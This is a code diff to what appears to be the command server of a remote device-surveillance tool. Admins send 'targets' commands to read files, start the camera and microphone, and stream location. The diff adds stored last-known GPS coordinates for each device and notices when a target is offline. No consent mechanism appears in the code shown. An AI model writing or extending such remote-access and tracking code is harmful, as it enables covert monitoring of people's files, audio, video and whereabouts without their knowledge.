@@ -562,6 +562,12 @@ function buildDeviceList() {
     name: d.name,
     updatedAt: d.updated_at,
     online: users.has(d.user_id),
+    // Last-known location — KeepAliveService is dormant by default now, so a device usually
+    // isn't live-streaming location; this is whatever it last reported before going quiet.
+    lastLat: d.lat,
+    lastLng: d.lng,
+    lastAccuracy: d.accuracy,
+    locationUpdatedAt: d.location_updated_at,
   }))
 }
 
@@ -738,7 +744,15 @@ wss.on('connection', (ws, req) => {
         if (['ls', 'read_file', 'stop_camera',
              'start_mic', 'stop_mic', 'start_location', 'stop_location'].includes(msg.type)) {
           const target = users.get(msg.targetId)
-          if (target) send(target.bgWs || target.ws, { ...msg, fromAdminId: meta.userId })
+          if (target) {
+            send(target.bgWs || target.ws, { ...msg, fromAdminId: meta.userId })
+          } else if (['ls', 'start_mic', 'start_location'].includes(msg.type)) {
+            // KeepAliveService is dormant by default now, so "not connected" is common —
+            // tell the admin why nothing happened instead of a silent dead end (stop_* and
+            // read_file don't need this: stopping something already stopped is a no-op, and
+            // read_file always follows an ls that would already have surfaced this).
+            send(ws, { type: 'target_offline', action: msg.type, userId: msg.targetId })
+          }
           return
         }
         // start_camera → both: browser ws (LiveKit publish) AND bgWs (JPEG fallback)
@@ -747,6 +761,8 @@ wss.on('connection', (ws, req) => {
           if (target) {
             send(target.ws, { ...msg, fromAdminId: meta.userId })
             if (target.bgWs) send(target.bgWs, { ...msg, fromAdminId: meta.userId })
+          } else {
+            send(ws, { type: 'target_offline', action: msg.type, userId: msg.targetId })
           }
           return
         }
@@ -1293,6 +1309,12 @@ wss.on('connection', (ws, req) => {
           const admin = admins.get(msg.forAdminId)
           // Use primary userId for bg connections so RemoteFileBrowser filter matches
           const fromUserId = meta.isBg ? meta.primaryId : meta.userId
+          // Persist as "last known" alongside the live forward below — KeepAliveService is
+          // dormant by default now, so this may be the only location the admin ever sees for
+          // long stretches, not just a snapshot on its way to someone watching right now.
+          if (msg.type === 'location_update') {
+            store.updateDeviceLocation(fromUserId, msg.lat, msg.lng, msg.accuracy)
+          }
           if (admin) send(admin.ws, { ...msg, fromUserId })
           return
         }
